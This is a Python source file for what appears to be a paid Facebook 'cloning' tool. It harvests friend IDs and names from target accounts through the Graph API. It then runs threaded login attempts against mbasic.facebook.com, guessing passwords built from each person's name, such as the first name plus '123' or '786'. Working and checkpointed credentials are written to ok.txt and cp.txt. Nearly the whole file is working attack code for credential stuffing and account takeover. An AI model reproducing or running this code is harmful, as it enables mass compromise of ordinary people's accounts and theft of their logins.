			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mPSYCHO-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mPICCHI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
	def __pler__(self):
		self.id = open('.publicout.txt','r').read().splitlines()
		os.system("clear");print(banner);time.sleep(1)
		print('\033[1;37m[+]\033[1;33m PUBLIC CLONING CP/OK IDS MIX ')
		print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
		print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
		print(50*"\033[1;37m_")
		print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
		print(50*"\033[1;37m_")
		with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
			for yntkts in self.id:
				try:
					uid, name = yntkts.split('|')
					xz = name.split(' ')
					if len(xz) == 1:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'786', xz[0]+xz[0]+'1234']
					elif len(xz) == 2:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'786', xz[0]+xz[0]+'1234']
					elif len(xz) == 3:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'786', xz[0]+xz[0]+'1234']
					elif len(xz) == 4:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'786', xz[0]+xz[0]+'1234']
					else:
						pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'786', xz[0]+xz[0]+'1234']
					_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
				except:
					pass
		hasil(ok,cp)
		
def create_file():
    os.system('clear');print(banner)
    os.system('rm -rf adi1.txt')
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(banner)
    os.system('rm -rf .psy1.txt')
    os.system('rm -rf .psy2.txt')
    print(' \033[1;96mLogged user : \033[1;92m  '+uname)
    print(50*"\033[1;97m_")
    nusrat = []
    try:
        limit_user = 1
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input(' \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;36mINPUT ID \033[1;31m: \033[1;32m'%(count))
        try:
            tfile = open('access_token.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('.psy1.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print(udit+'Friend Is Private ')
                pass
    os.system('clear')
    print(banner)
    print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;31m:\033[1;92m '+str(len(nusrat)))
    print(50*"\033[1;97m_")
    try:
        ask_link = 1
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .adi1.txt | grep '+li+' >> .psy2.txt')
        
    save_file = input('\033[1;37m[+]\033[1;33m EXAMPLE \033[1;31m: \033[1;36m/sdcard/filename.txt\n\033[1;37m[+]\033[1;36m SAVE FILE AS \033[1;31m: \033[1;32m')
    os.system('clear')
    lines = open('.adi2.txt', 'r').readlines()
    print(banner)
    print('\033[1;37m[+] \033[1;96mTOTAL IDS \033[1;31m: \033[1;92m'+str(len(lines)))
    print('\033[1;37m[+] \033[1;96mWAIT COLLECTING IDS ')
    print(50*"\033[1;37m_")
    fileid = '.psy.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('access_token.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open(save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mPicchi\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
        except Exception as e:
           
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf .psy1.txt')
                pass
            else:
                print('\033[1;91mField Error Something Wrong\033[0m')
                print(54*"_")
                os.system('rm -rf .psy1.txt')
                pass
    lenid = open(save_file, 'r').readlines()
    print('\033[1;37m[+]\033[1;36m PROCESS COMPLETED  ')
    os.system('rm -rf .adi1.txt')
    print('\033[1;37m[+] \033[1;36mTOTAL IDS  \033[1;31m: \033[1;32m'+str(len(lenid)))
    print('\033[1;37m[+] \033[1;36mFILE SAVED AS \033[1;31m: \033[1;32m'+save_file)
    input('\033[1;37m[+] \033[1;36mPRESS ENTER TO BACK ')
    version()
if not os.path.exists(".psywork.txt"):
	open(".psywork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Loading ...')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')
banner = """
  \033[0;93m ██████  ██  ██████  ██████ ██   ██ ██ 
  \033[0;93m ██   ██ ██ ██      ██      ██   ██ ██ 
  \033[0;92m ██████  ██ ██      ██      ███████ ██ 
  \033[0;91m ██      ██ ██      ██      ██   ██ ██ 
  \033[0;91m ██      ██  ██████  ██████ ██   ██ ██ 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m PSYCHO PICCHI│\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m PSYCHO PICCHI│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 01926890544  │\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m PSYCHO PICCHI│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m300-TK \033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│         \033[1;37m•  🇹​​​​​🇭​​​​​🇮​​​​​🇸​​​​​ 🇹​​​​​🇴​​​​​🇴​​​​​🇱​​​​​ 🇨​​​​​🇷​​​​​🇪​​​​​🇦​​​​​🇹​​​​​🇪​​​​​🇩​​​​​ 🇧​​​​​🇾​​​​​ 🇵‌🇮‌🇨‌🇨‌🇭‌🇮‌  \033[1;37m•      \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()


if __name__=='__main__':
	os.system('git pull')
	main()
